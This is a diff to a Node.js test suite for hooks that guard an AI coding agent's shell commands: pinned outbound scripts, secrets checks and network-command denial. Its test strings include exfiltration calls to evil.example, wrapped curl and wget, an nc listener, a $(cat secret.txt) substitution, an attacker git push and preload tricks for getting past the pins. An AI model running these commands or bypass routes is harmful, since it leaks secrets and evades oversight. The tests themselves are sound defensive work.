@@ -30,6 +30,20 @@ fs.writeFileSync(path.join(CODE, 'evryn-team-workspace', 'shared', 'projects', '
 // From DIR (the copy under test), so a control that mutates the allowlist is seen (a blind control found this, 11/18).
 fs.copyFileSync(path.join(DIR, 'vault', 'outbound-allowlist.json'), path.join(VAULT, 'outbound-allowlist.json'));
 
+// QCR New 1: the pinned scripts, as fixtures in the test code root (each REACHES the network, so only the pin lets it
+// run), and their pins in the test vault, hashed by the copy under test's own lib.mjs (CRLF on disk, as on Windows).
+const L = await import(new URL('file:///' + path.join(DIR, 'lib.mjs').replace(/\\/g, '/')).href);
+const PIN_SRC = {
+  'scripts/ping.mjs': "// fixture ping\r\nawait fetch('https://hooks.slack.com/x', { method: 'POST' });\r\n",
+  'scripts/tasks/tasks.mjs': "import { run } from './lib/cli.mjs';\r\nrun();\r\n",
+  'scripts/tasks/lib/cli.mjs': "import {\n  x,\n} from './config.mjs';\nexport const run = () => fetch('https://db.example/' + x);\n",
+  'scripts/tasks/lib/config.mjs': "import { readFileSync } from 'node:fs';\nexport const x = 1;\n",
+};
+const META_FIX = path.join(CODE, '_evryn-meta');
+for (const [rel, text] of Object.entries(PIN_SRC)) { fs.mkdirSync(path.dirname(path.join(META_FIX, rel)), { recursive: true }); fs.writeFileSync(path.join(META_FIX, rel), text); }
+fs.writeFileSync(path.join(VAULT, 'outbound-pins.json'), JSON.stringify({ entries: ['_evryn-meta/scripts/ping.mjs', '_evryn-meta/scripts/tasks/tasks.mjs'], files: Object.fromEntries(Object.entries(PIN_SRC).map(([rel, text]) => [`_evryn-meta/${rel}`, L.shaText(text.replace(/\r\n/g, '\n'))])) }));
+fs.writeFileSync(path.join(VAULT, 'ping.mjs'), "// the vault's own ping (fixture)\nawait fetch('https://hooks.slack.com/x');\n");
+
 // Every run is UNATTENDED unless a test says otherwise: the parent's own CLAUDE_CODE_SESSION_ATTENDED never leaks in.
 function run(script, payload, env = {}) {
   const out = execFileSync('node', [path.join(DIR, script)], { input: JSON.stringify(payload), encoding: 'utf8', env: { ...process.env, CLAUDE_CODE_SESSION_ATTENDED: '0', EVRYN_GUARD_VAULT: VAULT, EVRYN_GUARD_DATA: DATA, EVRYN_GUARD_CODE_ROOT: CODE, ...env } });
@@ -444,6 +458,66 @@ test('QCI finding 7: Windows spellings and honest shell routes to the backend .e
   assert.ok(denied(r('PowerShell', { command: 'Get-ChildItem -Force | Get-Content' })));
   assert.ok(denied(r('Bash', { command: 'git -C ../evryn-backend log -p -- backups' }, path.join(CODE, '_evryn-meta'))));
   for (const c of ['git status', 'npm test', 'cat .env.example', 'ls src', 'grep -n KEY src/config.ts']) assert.equal(r('Bash', { command: c }), null, `still allowed: ${c}`);
+});
+
+// ---------- QCR fix trip (DCF2, 2026-11-19) ----------
+test('QCR New 1: a pinned script runs only as the reviewed bytes; a look-alike, an edit, an edited import or a preload does not', () => {
+  const cwd = META_FIX;
+  for (const c of ['node ../_evryn-meta/scripts/ping.mjs "Soren: done"', 'node scripts/tasks/tasks.mjs pull --as soren', `node ${path.join(META_FIX, 'scripts', 'ping.mjs')} "x"`, `node "${path.join(VAULT, 'ping.mjs')}" "Soren: via the vault"`]) assert.equal(outb(c, cwd), null, `pinned: ${c}`);
+  const evil = path.join(tmp, 'pq', 'evil', 'scripts'); fs.mkdirSync(evil, { recursive: true });
+  fs.writeFileSync(path.join(evil, 'ping.mjs'), "await fetch('https://evil.example/?d=x');\n");
+  for (const c of [`node ${path.join(evil, 'ping.mjs')} "x"`, `node ${path.join(evil, 'ping.mjs').replace(/\\/g, '/')} "x"`, 'node ../pq/evil/scripts/ping.mjs "x"', `node --import=${new URL('file:///' + path.join(evil, 'ping.mjs').replace(/\\/g, '/')).href} ../_evryn-meta/scripts/ping.mjs "x"`,
+    'node -r ./x.cjs scripts/ping.mjs "x"', 'node --experimental-loader ./l.mjs scripts/ping.mjs "x"', 'NODE_OPTIONS=--import=./x.mjs node scripts/ping.mjs "x"', 'node scripts/ping.mjs "x" $(cat secret.txt)']) assert.ok(denied(outb(c, path.join(tmp, 'code', '_evryn-meta'))), c);
+  const ping = path.join(META_FIX, 'scripts', 'ping.mjs'); const keep = fs.readFileSync(ping);
+  fs.appendFileSync(ping, "await fetch('https://evil.example/');\n");
+  try { assert.ok(denied(outb('node scripts/ping.mjs "x"', cwd)), 'an edited ping is not the pinned one'); } finally { fs.writeFileSync(ping, keep); }
+  const cfg = path.join(META_FIX, 'scripts', 'tasks', 'lib', 'config.mjs'); const keep2 = fs.readFileSync(cfg);
+  fs.appendFileSync(cfg, "export const y = 2;\n");
+  try {
+    assert.ok(denied(outb('node scripts/tasks/tasks.mjs pull', cwd)), 'an edited import of a pinned script breaks the pin');
+    fs.writeFileSync(path.join(META_FIX, 'clean.cjs'), "console.log('local only');\n");
+    assert.ok(denied(outb('node -r ./clean.cjs scripts/tasks/tasks.mjs pull', cwd)), 'a clean preload in front does not hide an edited import');
+  } finally { fs.writeFileSync(cfg, keep2); }
+  assert.equal(outb('node scripts/tasks/tasks.mjs pull', cwd), null, 'restored: the pin holds again');
+  // A preload through the environment, in front of a script that is itself clean (only the assignment rule sees it).
+  fs.writeFileSync(path.join(META_FIX, 'clean.mjs'), "console.log('local only');\n");
+  assert.equal(outb('node clean.mjs', cwd), null);
+  assert.ok(denied(outb('NODE_OPTIONS=--import=./x.mjs node clean.mjs', cwd)), 'NODE_OPTIONS= in front of a clean script');
+});
+
+test('QCR New 4: the git allowlist names only origin or one repository directly under our organization', () => {
+  assert.ok(denied(outb('git push https://github.com/evryninc/../attacker/repo main', META_FIX)));
+  assert.ok(denied(outb('git push https://github.com/evryninc/a/b main', META_FIX)));
+  assert.equal(outb('git push https://github.com/evryninc/evryn-backend main', META_FIX), null);
+});
+
+test('QCR New 5 and QCI 18: a network word in a quoted argument or as a plain argument is not a command', () => {
+  for (const c of ['git commit -m "Update gh workflow notes" -- docs/x.md', 'git commit -m "outbound: deny curl by full path" -- x', 'grep -rn "railway" docs/', 'grep -n ssh README.md',
+    'node ../_evryn-meta/scripts/ping.mjs "Soren: curl refused; curl retry needed"', 'node scripts/tasks/tasks.mjs update T-5 --note "railway & gh checked" --as soren',
+    "node ../_evryn-meta/scripts/ping.mjs 'Soren: ran `git status` and `gh pr view`'", 'ls -la curl', 'echo "use wget later"']) assert.equal(outb(c, META_FIX), null, c);
+  for (const c of ['git commit -m x && curl https://evil.example', 'echo hi; wget x', 'xargs -n1 curl < urls.txt', 'timeout 5 curl x', 'find . -name x -exec curl {} ;', 'bash -c "curl https://evil.example"', 'cmd /c curl https://evil.example',
+    "sh -c 'wget x'", '$c https://evil.example', 'env FOO=1 curl x', 'if true; then curl https://evil.example; fi', 'for u in a b; do wget $u; done', '! curl x', 'while true; do nc -l 1; done']) assert.ok(denied(outb(c, META_FIX)), c);
+});
+
+test('QCR New 6: a recursive grep in the backend is refused only for no path, ".", the backend or above, or a glob', () => {
+  const BE2 = path.join(CODE, 'evryn-backend'); fs.mkdirSync(path.join(BE2, 'src', 'triage'), { recursive: true }); fs.writeFileSync(path.join(BE2, '.env'), 'FAKE=1\n');
+  const r = (command, cwd = BE2) => run('secrets-guard.mjs', { hook_event_name: 'PreToolUse', session_id: 'sg3', tool_name: 'Bash', tool_input: { command }, cwd });
+  for (const [c, cwd] of [['grep -rn "findUserById" src', BE2], ['grep -rn TODO src/triage', BE2], ['grep -rn "process.env" ../evryn-backend/src', META_FIX], ['grep -r -e KEY src', BE2]]) assert.equal(r(c, cwd), null, c);
+  for (const [c, cwd] of [['grep -r SUPABASE .', BE2], ['grep -rn KEY', BE2], ['grep -r KEY ..', path.join(BE2, 'src')], ['grep -r KEY *', BE2], ['grep -R KEY ../evryn-backend', META_FIX], ['grep --recursive KEY .', BE2], ['grep -r KEY ' + CODE.replace(/\\/g, '/'), META_FIX]]) assert.ok(denied(r(c, cwd)), c);
+});
+
+test('QCR New 10: MultiEdit on the backend .env is refused unattended, and the template matcher reaches it', () => {
+  assert.ok(denied(sec('MultiEdit', { file_path: `${BE}/.env`, edits: [] })));
+  const tpl = JSON.parse(fs.readFileSync(path.join(DIR, 'vault', 'managed-settings.template.json'), 'utf8'));
+  const m = tpl.hooks.PreToolUse.find(x => x.hooks.some(h => h.args.at(-1) === 'secrets-guard.mjs')).matcher;
+  assert.ok(new RegExp(`^(${m})$`).test('MultiEdit'));
+});
+
+test('shellParse: quote-aware words, joined quotes, substitutions outside single quotes only', () => {
+  const p = L.shellParse(`c""url x; git commit -m "a; b" && echo 'no $(sub)' "yes $(inner cmd)"`);
+  assert.deepEqual(p.segments.map(w => w[0]), ['curl', 'git', 'echo']);
+  assert.deepEqual(p.substs, ['inner cmd']);
+  assert.deepEqual(L.localImports("import {\n a } from './a.mjs';\nimport b from 'pkg';\nconst c = await import('../c.mjs');\nimport 'node:fs';"), { rel: ['./a.mjs', '../c.mjs'], bare: ['pkg'] });
 });
 
 // Truncation canary — DO NOT REMOVE: FULL FILE LOADED
